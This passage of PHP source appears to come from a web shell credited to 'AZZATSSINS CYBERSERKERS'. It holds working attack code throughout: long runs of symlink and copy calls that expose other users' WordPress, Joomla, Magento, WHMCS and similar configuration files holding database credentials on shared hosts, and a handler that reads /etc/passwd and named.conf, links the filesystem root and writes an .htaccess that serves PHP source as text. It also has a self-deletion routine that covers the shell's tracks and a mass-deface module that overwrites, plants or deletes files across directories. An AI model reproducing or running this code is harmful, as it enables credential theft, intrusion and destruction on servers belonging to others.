symlink('/var/www/vhosts/'.$user.'/html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/var/www/vhosts/'.$user.'/html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/var/www/vhosts/'.$user.'/html/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/portal/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/var/www/vhosts/'.$user.'/html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/var/www/vhosts/'.$user.'/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/var/www/vhosts/'.$user.'/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/var/www/vhosts/'.$user.'/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/var/www/vhosts/'.$user.'/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/var/www/vhosts/'.$user.'/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/config.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/var/www/vhosts/'.$user.'/conn.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/wp-configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/var/www/vhosts/'.$user.'/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/var/www/vhosts/'.$user.'/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/portal/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/var/www/vhosts/'.$user.'/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/var/www/'.$user.'/html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/var/www/'.$user.'/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/var/www/'.$user.'/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/var/www/'.$user.'/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/var/www/'.$user.'/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/var/www/'.$user.'/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/'.$user.'/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/'.$user.'/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/'.$user.'/config.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/var/www/'.$user.'/conn.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/wp-configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/var/www/'.$user.'/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/var/www/'.$user.'/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/portal/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/var/www/'.$user.'/html/html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/var/www/'.$user.'/html/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/var/www/'.$user.'/html/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/var/www/'.$user.'/html/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/var/www/'.$user.'/html/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/var/www/'.$user.'/html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/'.$user.'/html/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/'.$user.'/html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/'.$user.'/html/config.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/html/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/var/www/'.$user.'/html/conn.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/html/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/'.$user.'/html/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/wp-configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/var/www/'.$user.'/html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/'.$user.'/html/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/var/www/'.$user.'/html/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/portal/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/'.$user.'/html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/home/vhost/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/home/vhost/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/home/vhost/'.$user.'/public_html/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/home/vhost/'.$user.'/public_html/configuration.php',$user.' <~ JOOMLA.txt');
copy('/home/vhost/'.$user.'/public_html/config.inc.php',$user.' <~ OTHER.txt');
symlink('/home/vhost/'.$user.'/public_html/config.inc.php',$user.' <~ OTHER.txt');
copy('/home/vhost/'.$user.'/public_html/includes/config.inc.php',$user.' <~ OTHER.txt');
symlink('/home/vhost/'.$user.'/public_html/includes/config.inc.php',$user.' <~ OTHER.txt');
copy('/home/vhost/'.$user.'/public_html/db_config.php',$user.' <~ OTHER.txt');
symlink('/home/vhost/'.$user.'/public_html/config.in.php',$user.' <~ OTHER.txt');
copy('/home/vhost/'.$user.'/public_html/includes/db_config.php',$user.' <~ OTHER.txt');
symlink('/home/vhost/'.$user.'/public_html/includes/config.in.php',$user.' <~ OTHER.txt');
copy('/home/web/'.$user.'/www/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/home/web/'.$user.'/www/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/home/web/'.$user.'/www/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/home/web/'.$user.'/www/configuration.php',$user.' <~ JOOMLA.txt');
copy('/home/web/'.$user.'/www/config.inc.php',$user.' <~ OTHER.txt');
symlink('/home/web/'.$user.'/www/config.inc.php',$user.' <~ OTHER.txt');
copy('/home/web/'.$user.'/www/includes/config.inc.php',$user.' <~ OTHER.txt');
symlink('/home/web/'.$user.'/www/includes/config.inc.php',$user.' <~ OTHER.txt');
}
echo '<br><center><i><b><a href='.$xAzzatssinSx.'>CLICK ON HERE TO VIEW CONFIGS</a></b></i></center>';
}
}
if($_GET['symbolic']=="link"){
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("symlink",0777);
@chdir("symlink");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex AZZATSSINS.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='symlink/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("symlink",0777);
@chdir("symlink");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex AZZATSSINS.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=symlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("symlink",0777);@chdir("symlink");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex AZZATSSINS.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='AZZATSSINS'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=symlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }  
}

if($_GET['kill'] == 'self') {
rmdir('home5');rmdir('symlink');rmdir('home4');unlink('mysql.php');unlink('wk.php');unlink('rw.php');rmdir('home');rmdir('home1');rmdir('home2');rmdir('home3');rmdir('sym');$fn = $_SERVER['SCRIPT_FILENAME'];
 unlink($fn); exe('rm '.$fn); 
echo'<meta http-equiv="Refresh" content= "0; url=?">';

} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='azx.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
